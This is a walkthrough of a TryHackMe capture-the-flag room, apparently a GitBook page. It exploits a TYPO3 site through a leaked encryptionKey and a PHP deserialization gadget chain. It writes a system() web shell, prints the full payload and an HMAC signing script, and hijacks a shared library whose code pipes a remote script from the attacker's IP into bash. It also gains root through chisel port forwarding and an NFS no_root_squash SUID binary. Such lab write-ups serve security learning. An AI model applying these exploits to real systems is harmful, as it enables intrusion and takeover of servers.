---
description: 'Box-link: https://tryhackme.com/room/enterprize'
---

# Enterprize

![A full scheme to get user and root.](<../../.gitbook/assets/image (1) (1).png>)

## Enumeration

### port scan

```
# Nmap 7.80 scan initiated Thu Jul 28 20:49:37 2022 as: nmap -sV -T4 -Pn -n -p22,80 --min-rate=1000 -oA services -e tun0 10.10.195.28
Nmap scan report for 10.10.195.28
Host is up (0.077s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### http

Scanning for directories:

```
feroxbuster -u http://enterprize.thm/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x txt,zip,php,json,js 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://enterprize.thm/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/SecLists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [txt, zip, php, json, js]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       20w      199c http://enterprize.thm/.htaccess
200      GET        1l        5w       85c http://enterprize.thm/
403      GET        7l       20w      199c http://enterprize.thm/.htpasswd
403      GET        7l       20w      199c http://enterprize.thm/.hta
403      GET        7l       20w      199c http://enterprize.thm/.htaccess.txt
403      GET        7l       20w      199c http://enterprize.thm/.htpasswd.txt
403      GET        7l       20w      199c http://enterprize.thm/.hta.txt
403      GET        7l       20w      199c http://enterprize.thm/.htaccess.zip
403      GET        7l       20w      199c http://enterprize.thm/.htpasswd.zip
403      GET        7l       20w      199c http://enterprize.thm/.hta.zip
403      GET        7l       20w      199c http://enterprize.thm/.htaccess.php
403      GET        7l       20w      199c http://enterprize.thm/.php
403      GET        7l       20w      199c http://enterprize.thm/.htpasswd.php
403      GET        7l       20w      199c http://enterprize.thm/.hta.php
403      GET        7l       20w      199c http://enterprize.thm/.htaccess.json
403      GET        7l       20w      199c http://enterprize.thm/.hta.json
403      GET        7l       20w      199c http://enterprize.thm/.htpasswd.json
403      GET        7l       20w      199c http://enterprize.thm/.htaccess.js
403      GET        7l       20w      199c http://enterprize.thm/.hta.js
403      GET        7l       20w      199c http://enterprize.thm/.htpasswd.js
200      GET       20l       39w      589c http://enterprize.thm/composer.json
200      GET        1l        5w       85c http://enterprize.thm/index.html
403      GET        7l       20w      199c http://enterprize.thm/public
403      GET        7l       20w      199c http://enterprize.thm/server-status
403      GET        7l       20w      199c http://enterprize.thm/var
403      GET        7l       20w      199c http://enterprize.thm/vendor
[####################] - 45s    28278/28278   0s      found:26      errors:0      
[####################] - 44s    28278/28278   630/s   http://enterprize.thm/
```

We have an access to file `composer.json`.

```
curl http://enterprize.thm/composer.json 
{
    "name": "superhero1/enterprize",
    "description": "THM room EnterPrize",
    "type": "project",
    "require": {
        "typo3/cms-core": "^9.5",
        "guzzlehttp/guzzle": "~6.3.3",
        "guzzlehttp/psr7": "~1.4.2",
        "typo3/cms-install": "^9.5",
	"typo3/cms-backend": "^9.5",
        "typo3/cms-core": "^9.5",
        "typo3/cms-extbase": "^9.5",
        "typo3/cms-extensionmanager": "^9.5",
        "typo3/cms-frontend": "^9.5",
        "typo3/cms-install": "^9.5",
	"typo3/cms-introduction": "^4.0"
    },
    "license": "GPL",
    "minimum-stability": "stable"
}
```

Here we can see installed typo3 cms, but where is it?

### vhost brute-force

```
ffuf -u http://enterprize.thm/ -H "Host: FUZZ.enterprize.thm" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 85 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://enterprize.thm/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.enterprize.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 85
________________________________________________

maintest                [Status: 200, Size: 24555, Words: 1438, Lines: 49]
```

And we have a location of typo3 cms.

### maintest.enterprize.thm dirs brute-force

```
403      GET        7l       20w      199c http://maintest.enterprize.thm/.htaccess
403      GET        7l       20w      199c http://maintest.enterprize.thm/.htpasswd
200      GET       49l     1464w    24555c http://maintest.enterprize.thm/
301      GET        7l       20w      249c http://maintest.enterprize.thm/fileadmin => http://maintest.enterprize.thm/fileadmin/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://maintest.enterprize.thm/fileadmin (Apache)
403      GET        7l       20w      199c http://maintest.enterprize.thm/server-status
301      GET        7l       20w      249c http://maintest.enterprize.thm/typo3conf => http://maintest.enterprize.thm/typo3conf/
301      GET        7l       20w      245c http://maintest.enterprize.thm/typo3 => http://maintest.enterprize.thm/typo3/
301      GET        7l       20w      249c http://maintest.enterprize.thm/typo3temp => http://maintest.enterprize.thm/typo3temp/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://maintest.enterprize.thm/typo3conf (Apache)
403      GET        7l       20w      199c http://maintest.enterprize.thm/typo3temp/.htpasswd
403      GET        7l       20w      199c http://maintest.enterprize.thm/typo3temp/.htaccess
403      GET        7l       20w      199c http://maintest.enterprize.thm/typo3/.htpasswd
403      GET        7l       20w      199c http://maintest.enterprize.thm/typo3/.htaccess
301      GET        7l       20w      256c http://maintest.enterprize.thm/typo3temp/assets => http://maintest.enterprize.thm/typo3temp/assets/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://maintest.enterprize.thm/typo3temp/assets (Apache)
301      GET        7l       20w      253c http://maintest.enterprize.thm/typo3temp/var => http://maintest.enterprize.thm/typo3temp/var/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://maintest.enterprize.thm/typo3temp/var (Apache)
```

[http://maintest.enterprize.thm/typo3conf/](http://maintest.enterprize.thm/typo3conf/) reveals interesting file `LocalConfiguration.old`.&#x20;

## Gaining access

This file `LocalConfiguration.old` contains `encryptionKey` value which I think critical for the CMS. First link in google leads to this brilliant article: [https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html](https://www.synacktiv.com/en/publications/typo3-leak-to-remote-code-execution.html). Dude exploits Typo3 with leaked encryptionKey and he obtains RCE via deserialization...&#x20;

In order to gain RCE we need for our payload to reach unserialize method which will trigger execution of gadget chain. To generate a gadget chain use `phpggc`.

```
./phpggc -l | grep Guzzle
Guzzle/FW1                                6.0.0 <= 6.3.3+                    File write             __destruct          
Guzzle/INFO1                              6.0.0 <= 6.3.2                     phpinfo()              __destruct     *    
Guzzle/RCE1                               6.0.0 <= 6.3.2                     RCE (Function call)    __destruct     *    
Pydio/Guzzle/RCE1                         < 8.2.2                            RCE (Function call)    __toString          
WordPress/Guzzle/RCE1                     4.0.0 <= 6.4.1+ & WP < 5.5.2       RCE (Function call)    __toString     *    
WordPress/Guzzle/RCE2                     4.0.0 <= 6.4.1+ & WP < 5.5.2       RCE (Function call)    __destruct     *
```

Simple backdoor:

```
cat ~/thm/enterprize/backdoor.php 
<?php $output = system($_GET[1]); echo $output ; ?>
```

As author of the article, we use phpggc to gain gadget chain to write our backdoor in a specified file on a server:

```
./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/shell.php ~/thm/enterprize/backdoor.php
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDc6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vc2hlbGwucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fWk6NztpOjc7fQ==
```

Also, create a custom script on php to generate HMAC with SHA1 as algorithm, our payload as data and encryptionKey as key:

```
cat ~/thm/enterprize/generate_hmac.php 
<?php

$encryptionKey = "712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b";
$gadgetChainPayload = "YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDc6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vc2hlbGwucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fWk6NztpOjc7fQ==";
$base64EncodedGadgetChainPayload = hash_hmac("sha1", $gadgetChainPayload, $encryptionKey);
print($gadgetChainPayload.$base64EncodedGadgetChainPayload);
?> 
```

```
php ~/thm/enterprize/generate_hmac.php 
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDc6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vc2hlbGwucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7fWk6NztpOjc7fQ==63624213e24dd952ec588b4d75a6aaad32f0e636
```

Intercept the request of your form submition and paste payload + hmac in \_\_state field. Now, we have RCE at `/var/www/html/public/fileadmin/_temp_/shell.php`.

For some reason, my ip was blocked by target machine, so i switched vpn and got reverse shell with simple curl and bash reverse shell in shell.sh.

## Privilege escalation

### john

Exploring john's home directory found binary file `myapp` that loads `/usr/bin/libcustom.so`. Exfiltrate myapp and libcustom.so to your machine for further analysis.\
I analysed the binary and lib. myapp just loads do\_ping function from library. That function puts Test... in stdout. PayloadsAllTheThings suggests further: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#shared-library](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#shared-library). With this in mind, we check /etc/ld.so.conf.d/ folder on configs from where to load libraries. Inside, we see:

```
www-data@enterprize:/home/john/develop$ ls -la /etc/ld.so.conf.d/
ls -la /etc/ld.so.conf.d/
total 16
drwxr-xr-x  2 root root 4096 Jan  3  2021 .
drwxr-xr-x 98 root root 4096 Aug  1 18:32 ..
-rw-r--r--  1 root root   44 Jan 27  2016 libc.conf
lrwxrwxrwx  1 root root   28 Jan  3  2021 x86_64-libc.conf -> /home/john/develop/test.conf
-rw-r--r--  1 root root  100 Apr 16  2018 x86_64-linux-gnu.conf
```

So, a file x86\_64-libc.conf is actual symlink on file `/home/john/develop/test.conf` which john deleted, I think. We can write inside `/home/john/develop/`, thus, we control of what library to load instead of `libcustom.so`. Next step is to create a library for replacement:

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void do_ping(){
    system("curl http://10.14.27.146:8000/shell3.sh | bash");
}

```

Compile it with `gcc -Wall -fPIC -shared -o libcustom.so libcustom.c`. Then, upload it on the box and move in a folder you like. Then, write this folder in `test.conf`.

One big moment here is myapp which is running as cronjob every 2 minutes. You can be sure of it from pspy output:

```
2022/08/01 18:18:01 CMD: UID=0    PID=2002   | /sbin/ldconfig.real 
2022/08/01 18:18:01 CMD: UID=0    PID=2001   | /bin/sh -c /sbin/ldconfig 
2022/08/01 18:18:01 CMD: UID=1000 PID=2000   | /bin/sh -c /home/john/develop/myapp > /home/john/develop/result.txt 
2022/08/01 18:18:01 CMD: UID=0    PID=1999   | /usr/sbin/CRON -f 
2022/08/01 18:18:01 CMD: UID=0    PID=1998   | /usr/sbin/CRON -f
```

Now, we are waiting for a shell to spawn. &#x20;

### root

linpeas.sh showed the method for privesc:

```
╔══════════╣ Analyzing NFS Exports Files (limit 70)
-rw-r--r-- 1 root root 465 Jan  3  2021 /etc/exports
/var/nfs        localhost(insecure,rw,sync,no_root_squash,no_subtree_check)
```

This misconfiguration allows us to mount the folder on our machine and create a SUID binary to escalate privileges to root. But the port 2049 isn't accessible from our machine. Alright, let's use chisel for port forwarding (you can also use john's private ssh key to access and do port forwarding via ssh).

```
KALI: ./chisel server --reverse -p 8082
TARGET: ./chisel client 10.14.27.146:8082 R:2049:127.0.0.1:2049
```

Now, we can interact with our local 2049 port. I prepared and copied sh binary from target machine (`mv /bin/sh /var/www/html/public/fileadmin/_temp_/sh` as www-data) as target-box denies to execute sh from kali machine because of missed necessary libraries.&#x20;

```
mkdir /tmp/pe
sudo mount -t nfs 127.0.0.1:/var/nfs /tmp/pe
cp ~/Downloads /tmp/pe/sh
sudo chown root:root /tmp/pe/sh
sudo chmod +xs /tmp/pe/sh
```

```
cd /var/nfs && ./sh -p
```

Thus, we got a root user.
